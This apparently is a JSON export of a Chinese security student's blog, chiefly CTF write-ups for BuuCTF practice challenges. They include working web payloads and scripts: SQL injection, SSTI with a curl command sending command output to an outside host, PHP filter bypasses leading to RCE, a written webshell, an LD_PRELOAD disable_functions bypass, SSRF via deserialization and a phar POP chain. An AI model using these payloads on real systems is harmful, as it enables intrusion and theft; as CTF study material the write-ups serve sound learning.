{"pages":[{"title":"","text":"Blog😄 plz visit cjm00n.top document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","link":"/README.html"},{"title":"About","text":"关于 Blog十分感谢 Minos 主题的作者和我的朋友 @hoon 对于本站样式的帮助 部分的修改情况可以参考以往的文章 关于我华工大三信安专业在读, 熟练使用C-c C-v编程 常用 ID cjM00N or 月亮 目前为 Kap0k 战队 Web 手, NS 玩家 , 吉他初学者, 职业递茶玩家 以及单身 联系方式Email: Y2ptMDBuQHFxLmNvbQ==or 评论均可 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","link":"/about/index.html"},{"title":"Friends","text":"给大哥们递茶.gif Verhttps://vergissmeinnichtz.github.io/ 三线程霸主, 日常 AK 密码的五边形选手 C0mRaDehttps://coomrade.github.io/ Web 大哥, Kap0k 灵魂支柱 Byzerohttps://www.zerocre.com/ Pwn 爷爷 Q4nhttps://q4n.github.io/ 年轻的 Pwn 爷爷 Sjoshuahttp://sforest.in/ MISC 霸主, ACM&CTF 双修选手, 渗透 Uppp document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","link":"/friends/index.html"}],"posts":[{"title":"BuuCTF刷题记录","text":"感谢 glzjin 师傅 [HCTF 2018]WarmUp这是 CISCN2019 华南赛区半决赛的题目…当时没做出来 太菜了 题目源自 CVE-2018-12613 源码如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849\"source.php\",\"hint\"=>\"hint.php\"]; if (! isset($page) || !is_string($page)) { echo \"you can't see it\"; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } echo \"you can't see it\"; return false; } } if (! empty($_REQUEST['file']) && is_string($_REQUEST['file']) && emmm::checkFile($_REQUEST['file']) ) { include $_REQUEST['file']; exit; } else { echo \"\"; }?> 这里可以看到, 有is_string的判断, 数组绕过是不可行的, 只能绕过checkFile, 而checkFile里面有二次urldecode, 这给我们提供了机会, 如果我传一个 1?file=source.php%253f 其中%253f是?的二次编码, 这样既可绕过前面的检测, 那么接下来就是使用目录穿越了 先访问hint.php, 可以看到 1flag not here, and flag in ffffllllaaaagggg 这里有个知识点是, 当二重编码时, 这里的source.php相当于一个目录, 也就是说我们位于 12location: /var/www/html/source.php/flag: /ffffllllaaaagggg 所以 4 次目录穿越, payload 如下 1?file=source.php%253f/../../../../ffffllllaaaagggg 或者不用判断多少直接多来几个/../也可以 最终 payload 1?file=source.php%253f/../../../../ffffllllaaaagggg [强网杯 2019]随便注解题一fuzz 之后发现过滤了select 上网找找有没有能绕过 select 的方法, 查到了堆叠过滤, 简单测一下, 我们先输入一个复合语句 11';show tables; 可以看到输出正常, 说明后端的实现应该是 1mysqli_multi_query($sql); 而平时的实现是mysql_query这样的语句可以支持多条 sql 语句同时执行, 那要绕过 select 的过滤的话可以使用 1set @t=0x68616861686168;prepare x from @t;execute x; 预编译语句来执行, 其中@t 的部分是执行语句的 hex 编码, 例如我们要执行 1select * from `1919810931114514`; hex 编码后替换上面的aaaaa即可 解题二这里其实已经有了一个select, 那我们如果利用这个来查询的话就可以直接查询 flag 了 先查看一下两个表的结构, 表名我们前面已经查出来了 11';show columns from words; 有两个列, 一个是 id 另一个是 data, 明显 id 就是查询的索引, 所以先重命名两个表 1RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;# 可以给表增加一个 id 列或者直接将 flag 列改成 id 列, 然后万能密码 11' or 1=1# 查出 flag GetFlag最终 payload 如下 11';Set @t=0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460;Prepare x from @t; Execute x; [强网杯 2019]高明的黑客强网杯的题目, 拉下来有 3001 个混淆过的 php, 随便打开后可以看到有输出 回来看一下源码, 可以看到有许多 get 或者 post 的参数, 并且有eval, system, assert等系统函数, 但是大部分都赋值或者无法使用 当时比赛的时候还傻乎乎的用 phpstorm 去一行行跟过, 这题主要考察的是 fuzz 的想法, 通过对这些文件进行 fuzz 来查找可以使用的参数, 首先需要启动 php 服务, 在 win 下我们使用 phpstudy 直接开就可以了, linux 下直接 1php -S 0:8080 即可访问, 然后是通过正则去匹配传入的参数名 1(?","link":"/CTF/BuuCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95.html"},{"title":"BuuCTF刷题记录2","text":"title: BuuCTF刷题记录2date: 2020-02-14 17:05:24categories: - CTFtags: - Writeup—感谢 glzjin 师傅 [WesternCTF2018]shrine首先看题目 1234567891011121314151617181920212223242526import flaskimport osapp = flask.Flask(__name__)app.config['FLAG'] = os.environ.pop('FLAG')@app.route('/')def index(): return open(__file__).read()@app.route('/shrine/')def shrine(shrine): def safe_jinja(s): s = s.replace('(', '').replace(')', '') blacklist = ['config', 'self'] return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine))if __name__ == '__main__': app.run(debug=True) WAF 只有过滤()和设置config以及self为空, 而我们可以看到 flag 在app.config里面, 这里参考 https://www.jianshu.com/p/1237c78a691c 没有了直接的 config, 我们可以通过current_app来获取, 通过查阅手册, 可以发现在函数url_for中存在这个变量 那么就可以通过下面的 payload 来获取 1{{url_for.__globals__['current_app'].config}} 同样的函数还有get_flashed_messages 或者使用 1{{app.__init__.__globals__.sys.modules.app.app.__dict__}} 国外大佬的方法就比较硬核了 https://ctftime.org/writeup/10851 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# search.pydef search(obj, max_depth): visited_clss = [] visited_objs = [] def visit(obj, path='obj', depth=0): yield path, obj if depth == max_depth: return elif isinstance(obj, (int, float, bool, str, bytes)): return elif isinstance(obj, type): if obj in visited_clss: return visited_clss.append(obj) print(obj) else: if obj in visited_objs: return visited_objs.append(obj) # attributes for name in dir(obj): if name.startswith('__') and name.endswith('__'): if name not in ('__globals__', '__class__', '__self__', '__weakref__', '__objclass__', '__module__'): continue attr = getattr(obj, name) yield from visit(attr, '{}.{}'.format(path, name), depth + 1) # dict values if hasattr(obj, 'items') and callable(obj.items): try: for k, v in obj.items(): yield from visit(v, '{}[{}]'.format(path, repr(k)), depth) except: pass # items elif isinstance(obj, (set, list, tuple, frozenset)): for i, v in enumerate(obj): yield from visit(v, '{}[{}]'.format(path, repr(i)), depth) yield from visit(obj) 修改的app.py 123456789101112131415161718192021import flaskimport osfrom flask import requestfrom search import searchapp = flask.Flask(__name__)app.config['FLAG'] = 'TWCTF_FLAG'@app.route('/')def index(): return open(__file__).read()@app.route('/shrine/')def shrine(shrine): for path, obj in search(request, 10): if str(obj) == app.config['FLAG']: return pathif __name__ == '__main__': app.run(debug=True) 通过遍历request来查找是否存在某个子属性和app.config['FLAG']是一致的, 最后找的 payload 是 1{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}} 其实可以看到和前面的思路是一致的, 只是获取的路径不同 [GWCTF 2019]你的名字顺带就来做一下上次比赛没整出来的 SSTI 这道题其实很明显的是模板注入, 出题人恶趣味的用了index.php这样的路由, 但是实际上还是一道 python 题 先来 fuzz 一下 当输入为class的时候, 结果会被过滤, 应该是有 waf 用6测一下发现还有 php 的报错, 这是真的 sxbk 但是这里是用不了了 我们上网查一下就会发现, 在 ssti 中过滤了后, 可以通过{\\%外带 Python 模板注入(SSTI)深入学习 上面链接中的 payload 改一下就可以用 1{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://xx.xxx.xx.xx:8080/?i=`ls /`') %}1{% endif %} 但是还有一个问题是有关键字符的过滤, 上网找一下 ssti 的字典 当然是没找到了 可以发现双写绕不过, 应该是循环匹配, 替换为空的话我们可以利用这个特点来绕过, 但是这里毫无提示, 感觉只能纯靠猜, 找到一个词符合以下条件 在ban_list中尽量靠后 不出现在我们的 payload 里面 由于第一个是黑箱, 我们只能从第二个入手 fuzz 脚本 12345678910111213141516171819202122232425262728293031323334353637import reimport requestsfrom time import sleepurl = \"http://f9fd3c30-c575-4a29-88a3-680ebc168df5.node3.buuoj.cn\"def gen_words(): f = open(\"ssti_payload.txt\", \"r\").read() words = re.findall(\"[a-zA-Z]+\", f) f = open(\"ssti_word.txt\", \"w\") res = sorted(list(set(words))) for i in res: f.write(i + \"\\n\") return resdef find_unused_word(words, payload): used_word = list(set(re.findall(\"[a-zA-Z]+\", payload))) return [i for i in words if i not in used_word]def fuzz(): payload = \"{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://xx.xxx.xx.xx:8080/?i=`ls /`') %}1{% endif %}\" words = gen_words() unused_word = find_unused_word(words, payload) for i in unused_word: data = { \"name\": i } res = requests.post(url, data=data).text if \"hello !\" in res: data = { \"name\": \"cla\" + i + \"ss\" } res = requests.post(url, data=data).text if \"class\" in res: print(f\"[*] find {i}\") sleep(0.1)if __name__ == \"__main__\": fuzz() 由于结果只有几个, 我们挨个试一下, 就会发现config是可用的 使用小号开一个Linux labs 之后再改造一下 payload 1{% iconfigf ''.__claconfigss__.__mrconfigo__[2].__subclaconfigsses__()[59].__init__.func_gloconfigbals.linecconfigache.oconfigs.popconfigen('curl http://174.0.167.222:2333/ -d `ls /|base64`') %}1{% endiconfigf %} 注意这里最后必须要是endiconfigf, 不是很懂为什么, 猜测是要和前面的iconfigf一致吧, 其他的情况都会导致打不通 然后我们就可以 rce 了, 由于返回只有一行, 就拼接了个|base64 [SWPU2019]Web1这题咋一看还以为是个 XSS—- 但是这管理员一直不确认的就很迷惑了 然后查了一下才发现不是 XSS 是个 SQL 题 可以看到注入点有几个, 比如申请广告这里 还有查看的时候 测试一下发现id那里打不通, 就回到广告这里, 顺利的看到了注入点 当然这丧心病狂的 22 列是真的顶 首先可以看到``被过滤, 直接使用/**/或者(就可以绕过了, 主要是下面两点 Bypass information_schema做过 sqli 的都知道这个库的厉害, 但是现在也经常被过滤 (例如过滤or), 那么我们就需要新的姿势了 https://www.anquanke.com/post/id/193512 https://www.cnblogs.com/wangtanzhi/p/12241499.html 可以看到大部分是用了sys.schema_auto_increment_columns这个库 由于在 Buuoj 上面没有这个库, 这里用的姿势是 1-1'union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 这样来获取表名 无列名注入先回顾一下我们常规的思路, 一般我们是通过information_schema.columns注入出所有列名再进行查询, 而这里我们用不了这个库, 就可以考虑无列名注入 1select 1,2,3; 此时可以看到列名分别为 1,2,3 1select 1,2,3 union select * from users; 这里可以看到我们通过union连接来改变原来的列名, 所以我们可以通过 1select `2` from (select 1,2,3 union select * from users)x; 这里有几个注意的点 列名用反引号, 这里因为是数字, 我们需要使用反引号包起来, 如果不用的话会全部变成 2 子select要用()包起来 子select最后要赋予一个别名, 不然会报错 然后我们就可以注入了 12-1'union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 我现在才发现select*from users是成立的, 中间不需要用空格…. 然后就可以拿 flag 了 [CISCN 2019 初赛]Love Math这道题蛮有意思的, 先看代码 12345678910111213141516171819202122232425262728= 80) { die(\"太长了不会算\"); } $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $content)) { die(\"请不要输入奇奇怪怪的字符\"); } } //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(\"请不要输入奇奇怪怪的函数\"); } } //帮你算出答案 eval('echo '.$content.';');} 代码中做了三个判断 长度必须小于 80 过滤一部分符号 1' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]' 匹配所有函数变量名必须在$whitelist中, 比如pi 这个正则来源可以见 https://www.php.net/manual/zh/language.variables.basics.php 其实第一个是最难的 hhhh 看一下手册就可以看到, 有个函数很特别 这个返回值是string就很妙了, 那么我们可以通过这样的方法来转换出我们需要的字符 123$command = \"phpinfo\";echo base_convert($command,36,10);# >:55490343972 这样就能得到一个纯数字, 然后通过 1base_convert(55490343972,10,36)(); 就可以执行了 然后同理我们可以拼出 12base_convert(1751504350,10,36)(base_convert(784,10,36));# system(ls) 但是读文件就比较困难了, base_convert只能转换[a-z0-9], 而读文件需要空格, 本题的 flag 在/flag, 那就势必需要能够转换特殊字符的函数了, 这里有两个思路 hex2bin先看一下手册 这个函数可以实现将 Hex 转换成字符串, 也就是 但是这样会出现字母, 本地先转换成 10 进制, 然后在 payload 使用dechex转换回去就可以了, 具体操作如下 123base_convert(696468,10,36)(base_convert(37907361743,10,36)(dechex(1819484207)))# system(hex2bin(dechex(1819484207)))# system('ls /') 当然想法很好, 长度却不够了, 这里的替换思路有两个, 一个是将system换成exec, 并更改进制来尽量减少位数, 只要不出现字母就可以了 12base_convert(47138,20,36)(base_convert(3761671484,13,36)(dechex(1819484207)))# exec('ls /') 刚好 79, 可以执行 但是没有全部返回 hhh, 这里知道是在/flag, 就可以直接打, 不过命令也是比较取巧 12base_convert(47138,20,36)(base_convert(3761671484,13,36)(dechex(474260451114)))# exec('nl /*') 另外一种就是构造$_GET, 然后就可以为所欲为了 hhhh 1234$pi=base_convert(3761671484,13,36)(dechex(1598506324));$$pi{0}($$pi{1})# $pi=hex2bin(dechex(1598506324));# $pi=_GET# $$pi=$_GET 这里利用的是 php 的可变变量特性 剩下的就显而易见了 从其他位置获取参数可以在 https://xz.aliyun.com/t/4906#toc-8 中看到 ROIS 使用的 payload 是 12$pi=base_convert;$pi(371235972282,10,28)(($pi(8768397090111664438,10,30))(){9})# system(getallheaders(){9}) 实测的时候一直没有打通, 研究了一下发现这个 payload 需要在 apache 环境下 buu 上是用 nginx, 所以打不通, 其他的类似函数因为长度问题用不了, 就当了解一下了 [极客大挑战 2019]RCE ME参考 https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html 这个过滤的话很明显就能想到 p 神上面那篇文章, 直接取反就可以绕过了, 然后我们想办法执行, 先看一下phpinfo() 1(~%8F%97%8F%96%91%99%90)(); 然后是disable_function 1pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl 可以看到mail没有被禁, 那么我们待会就可以用来绕过 这里的话我们只能够拼接assert而不能拼接eval, 这是由 php 的特性决定的 然后看一下环境是在 Apache 下, 那么有一说一还是getallheaders舒服 参考 https://evoa.me/index.php/archives/62/ 12(~%9E%8C%8C%9A%8D%8B)((~%91%9A%87%8B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)()));# assert(next(getallheaders())); 然后在User-Agent输入命令即可 为了Bypass disable_function, 先让蚁剑连上来, 写 shell 1User-Agent: print_r(file_put_contents(\"/tmp/a.php\",'')) 然后包含 1User-Agent: include(\"/tmp/a.php\"); 蚁剑就可以连上来了 这里先提供一个懒人方法 使用蚁剑的插件 就可以直接绕过了 hhh, 当然我们不能这样, 还是要一步一步来 推荐以下两篇文章 https://www.anquanke.com/post/id/175403 https://www.freebuf.com/articles/web/192052.html 无论学什么都能在一叶飘零师傅的文章中找到.jpg 我们知道如果要加载LD_PRELOAD需要新起进程, 在 php 解释器运行中, 第一次执行execve是调用 php 解释器, 如果出现第二个execve就是有新进程的生成, 这里的测试 php 如下 12&1|grep -C3 execve 可以看到确实出现了多个execve, 同样的函数还有imap_open 这里我就直接使用了前面链接中的文件 首先是exp.c 123456789101112131415161718192021222324252627#define _GNU_SOURCE#include #include #include extern char** environ;__attribute__ ((__constructor__)) void preload (void){ // get command line options and arg const char* cmdline = getenv(\"EVIL_CMDLINE\"); // unset environment variable LD_PRELOAD. // unsetenv(\"LD_PRELOAD\") no effect on some // distribution (e.g., centos), I need crafty trick. int i; for (i = 0; environ[i]; ++i) { if (strstr(environ[i], \"LD_PRELOAD\")) { environ[i][0] = '\\0'; } } // executive command system(cmdline);} 在 linux 中编译 1gcc -shared -fPIC exp.c -o exp_x64.so exp.php 12345678910111213141516171819 然后通过蚁剑一起上传上去, 带上参数访问即可 不用蚁剑的话可以通过开另一台linux_lab来传 1copy(\"http://ip:port/exp.so\",\"/tmp/exp.so\"); 方法很多, 蚁剑是比较方便的方法 [SUCTF 2019]EasyWeb源码如下 123456789101112131415161718192021222324252627282930313233343536373818){ die('One inch long, one inch strong!');}if ( preg_match('/[\\x00- 0-9A-Za-z\\'\"\\`~_&.,|=[\\x7F]+/i', $hhh) ) die('Try something else!');$character_type = count_chars($hhh, 3);if(strlen($character_type)>12) die(\"Almost there!\");eval($hhh);?> 绕过正则首先有长度和正则的过滤, 我们需要先想办法构造一个$_GET出来, fuzz 一下特殊符号, 发现还有^, 那大概就是异或来绕过正则了, 而我们在下面还可以看到有个 1$character_type = count_chars($hhh, 3); 也就是说我们不能使用超过 12 种字符 那先用脚本构造一下 1234567891011121314151617181920import repattern = re.compile('[\\x00- 0-9A-Za-z\\'\"\\`~_&.,|=[\\x7F]+', re.I)payload = \"_GET\"for i in range(1, 256): if pattern.match(chr(i)): continue res = f\"%{i:02x}\" * len(payload) res += \"^\" f = False for j in payload: new = ord(j)^i if pattern.match(chr(new)): f = True break res += f\"%{ord(j)^i:02x}\" if f: continue print(res) 然后从输出中随便选一个来构造 1${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo 文件上传这里其实就是让你去调用get_the_flag() 那么我们来康康这个函数干啥 1234567891011121314function get_the_flag(){ ... if(!empty($_FILES[\"file\"])){ $tmp_name = $_FILES[\"file\"][\"tmp_name\"]; $name = $_FILES[\"file\"][\"name\"]; $extension = substr($name, strrpos($name,\".\")+1); if(preg_match(\"/ph/i\",$extension)) die(\"^_^\"); if(mb_strpos(file_get_contents($tmp_name), ' start: if attack(i, mid): start = mid + 1 else: end = mid mid = (end + start) // 2 sleep(0.02) flag += chr(mid) print(flag)if __name__ == \"__main__\": # try_length() main() 然后就能注出密码 登陆后可以看到有个文件上传点 上传后提示会记录文件名, 并且 log 文件为php格式, 但是由于存在/php/i的过滤, 使用短标签绕过 1 后面就直接cat /flag [HITCON 2017]SSRFme12345678910111213141516171819 () = => like 然后就可以顺利注出表名和列名 1-1'^(updatexml(1,concat(0x7e,(SELECT(group_concat(column_name))from(information_schema.columns)where((table_schema)like(database()))),0x7e),1))^'1 这里可以看到在拿 flag 的时候出现了长度不够 1-1'^(updatexml(1,concat(0x7e,(SELECT((group_concat(password)))from(H4rDsq1)),0x7e),1))^'1 加上个reverse即可 1-1'^(updatexml(1,concat(0x7e,(SELECT(reverse(group_concat(password)))from(H4rDsq1)),0x7e),1))^'1 手动拼接即可得到 flag [LCTF 2018]bestphp’s revengeindex.php 123456789101112 flag.php 1234567session_start();echo 'only localhost can get flag!';$flag = 'LCTF{*************************}';if($_SERVER[\"REMOTE_ADDR\"]===\"127.0.0.1\"){ $_SESSION['flag'] = $flag; }only localhost can get flag! 源码如上, 大概的想法是通过 1call_user_func($_GET['f'], $_POST); 这一行进行变量覆盖, 然后在最后一行执行代码 首先尝试将$b覆盖成var_dump 但是这里失败了, 不太懂为什么没有覆盖成功 查了一下相应的 wp, 也是用的extract, 这就很迷了 lctf2018-bestphps-revenge-详细题解 推荐一下smi1e师傅的 wp, 以下直接引用部分 我们可以看到代码中的session_start()十分突兀, 可以说没有啥用, 那应该就是突破口, 在 php 中, session 的存储位置是在文件中, 并且有一次反序列化的过程, 这就有了 session 反序列化的漏洞 php 的反序列化引擎有三种 php: 1name|s:5:\"Smi1e\"; php_serialize: 1a:1:{s:4:\"name\";s:5:\"Smi1e\";} php_binary: 1names:5:\"Smi1e\"; 可以看到不同的引擎的反序列化方式不同, 类似于反序列化字符串逃逸, 如果使用了不同的引擎, 也可能出现反序列化逃逸, 例如 1a:1:{s:4:\"name\";s:5:\"|O:5:\"Smi1e\":1:{s:4:\"test\";s:3:\"AAA\";}\";} 在php引擎中会从|分隔, a:1:{s:4:\"name\";s:5:\"作为 key, O:5:\"Smi1e\":1:{s:4:\"test\";s:3:\"AAA\";}\";}作为 value, 最后会把它进行 unserialize 处理, 这就出现了漏洞 但是空有漏洞也没有用, 我们需要对 flag.php 进行 ssrf, 由于题目没有类对象, 我们需要从原生的类入手 https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0 可以看到SoapClient类就符合这个特点, 所以这里的思路就是 生成SoapClient的 payload 先设置为php_serialize引擎, 将 payload 注入 再次访问, 调用SoapClient类中不存在的方法, 触发__call__, 从而实现 ssrf 一步步来, 首先是生成 payload 123456 $path, 'location' => $path)); $payload = serialize($o); echo \"|\".$payload; 生成 1|O:10:\"SoapClient\":4:{s:3:\"uri\";s:25:\"http://127.0.0.1/flag.php\";s:8:\"location\";s:25:\"http://127.0.0.1/flag.php\";s:15:\"_stream_context\";i:0;s:13:\"_soap_version\";i:1;} 然后访问 再利用call_user_func的特性, 当传入的第一个参数为数组时, 数组的第一个元素作为类名, 第二个元素为方法 这里的访问就是 1call_user_func(array(\"SoapClient\", \"welcome_to_the_lctf2018\")); 就会触发__call__, 实现 ssrf 最后访问index.php, 将获取到的 session 填入 cookie 即可 签到题都这么有水平, lctf 太顶了 [RoarCTF 2019]Online Proxy 可以看到有 ip, 那么有几种可能 SSTI 命令注入 sql 注入 结合文字应该就是 sql 注入了, 不过这里注入的情况比较特别, 需要三次访问才会出结果 访问, 程序记录 IP 第二次访问, 如果不同, 则将上次的 IP 放入数据库 第三次访问, 如果与第二次相同, 则从数据库查询上次的 IP 这就是二次注入了, 脚本如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import requestsimport refrom time import sleepurl = \"http://node3.buuoj.cn:25528/\"proxies = { \"http\": \"127.0.0.1:8080\"}static_headers = { \"X-Forwarded-For\": \"111\",}session = requests.Session()def test(cur, mid): # table: F4l9_D4t4B45e payload = \"-1' and (ascii(substr((select reverse(group_concat(schema_name)) from information_schema.schemata),%d,1))>%d)^'0\" % (cur, mid) # table: F payload = \"-1' and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='F4l9_D4t4B45e'),%d,1))>%d)^'0\" % (cur, mid) payload = \"-1' and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema='F4l9_D4t4B45e'),%d,1))>%d)^'0\" % (cur, mid) payload = \"-1' and (ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),%d,1))>%d)^'0\" % (cur, mid) headers = { \"X-Forwarded-For\": payload, } res = session.get(url, headers=headers, timeout=5) res = session.get(url, headers=static_headers, timeout=5) res = session.get(url, headers=static_headers, timeout=5).text # print(res) result = re.findall(\"(?%d)\" % (cur, mid) payload = \"0^(ascii(substr((select(reverse(group_concat(table_name)))from(information_schema.tables)),%d,1))>%d)\" % (cur, mid) payload = \"0^(ascii(substr((select(reverse(group_concat(column_name)))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))>%d)\" % (cur, mid) payload = \"0^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))>%d)\" % (cur, mid) res = session.get(f\"{url}?id={payload}\", timeout=5).text if \"Click\" in res: return True return False # print(result)def main(): flag = \"\" for i in range(172, 220): end = 127 start = 31 mid = (end + start) // 2 while end > start: if test(i, mid): start = mid + 1 else: end = mid mid = (end + start) // 2 sleep(0.05) flag += chr(mid) print(flag)if __name__ == \"__main__\": # attack() # test() main() [ByteCTF 2019]EZCMS第一步是 hash 拓展攻击 先随便登录一下, 可以在cookie中看到 1hash=52107b08c0f3342d2153ae1d68e6262c 翻一下源码, 这里是 12$secret = \"E3ry7Hjq\";setcookie(\"hash\", md5($secret.\"adminadmin\")); 在验证的地方, 验证 1234567891011function is_admin(){ $secret = \"E3ry7Hjq\"; $username = $_SESSION['username']; $password = $_SESSION['password']; if ($username == \"admin\" && $password != \"admin\"){ if ($_COOKIE['user'] === md5($secret.$username.$password)){ return 1; } } return 0;} 那么只需要在 hashpump 里面 然后替换成% 1admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00admin 登陆后就是 admin 了 然后继续看源码, 这道题不难看出是个构造 pop 链的题, 可以看到在 config.php 里面 File类存在一个__destruct 里面会调用check->upload_file 在Profile类中存在一个__call函数, 可以调用admin->open, 那么如果我们能找到某个类的open可以删除文件, 也就是程序默认生成的.htaccess, 就可以 RCE 了, 这个类就是ZipAchrive https://www.anquanke.com/post/id/95896#h2-4 现在，我们在本地去测试每个类的行为。经过一段时间的测试之后，我发现，ZipArchive->open 方法可以删除目标文件，前提是我们需要将其第二个参数设定为“9”。 为什么要设定为 9 呢？原因在于， ZipArchive->open()的第二个参数是“指定其他选项”。而 9 对应的是 ZipArchive::CREATE | ZipArchive::OVERWRITE。由于 ZipArchive 打算覆盖我们的文件，所以就会先对其进行删除。在此，感谢@pagabuc帮助我们解释了这一参数的具体意义。 那么现在，我们就可以使用 ZipArchive->open()来删除.htaccess 文件。 构造链如下 1File -> __destruct -> Profile -> upload_file(不存在) -> __call -> ZipArchive -> open 生成的脚本 123456789101112131415161718192021222324252627282930313233343536373839admin = $z;$f = new File();$f->checker = $p;unlink(\"1.phar\");$phar = new Phar(\"1.phar\"); //后缀名必须为phar$phar->startBuffering();// setStub(\"GIF89a\" . \"\"); //设置stub$phar->setMetadata($f); //将自定义的meta-data存入manifest$phar->addFromString(\"test.txt\", \"test\"); //签名自动计算$phar->stopBuffering(); 对于如何绕过 phar 协议的过滤可以看这篇文章 https://blog.zeddyu.info/2019/08/24/SUCTF-2019/#php-filter zedd 师傅的文章都写的很好 通过 php 伪协议来绕过 1php://filter/read=convert.base64-encode/resource=phar:// 而这里恰好有一个触发的函数 那么就可以开始了 生成 webshell, 由于eval无法动态构造, 这里就直接这样了 123 上传 webshell 生成我们的 phar 文件并上传 访问 view.php, 这里需要注意 phar 文件的路径 1http://078e3606-5996-4c33-9dff-00db1aaa228f.node3.buuoj.cn/view.php?filename=eec2d95bc618625503306c10fad5d37d.phar&filepath=php://filter/resource=phar://./sandbox/2c67ca1eaeadbdc1868d67003072b481/eec2d95bc618625503306c10fad5d37d.phar rce [BJDCTF2020]Cookie is so stable这道题以为他用的是smarty, 还以为他的这句话是用了waf 测了半天发现不靠谱, 原来这是个twig 上网抄个 payload 就可以直接打了…. 具体可以看这里 一篇文章带你理解漏洞之 SSTI 漏洞 1{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"cat /flag\")}} 果然还是要测一测是什么引擎先 [BJDCTF2020]EasySearch123456789101112131415161718192021222324252627282930313233343536 跑(抄)出来的 md5 是 12020666 后面利用的是 apache 的 ssi 漏洞注入 SSI 注入漏洞总结 flag 在上一层 [BJDCTF2020]EzPHP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051 绕过 1preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\\"|\\'|log/i', $_SERVER['QUERY_STRING']) url 编码即可 绕过 1234if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && 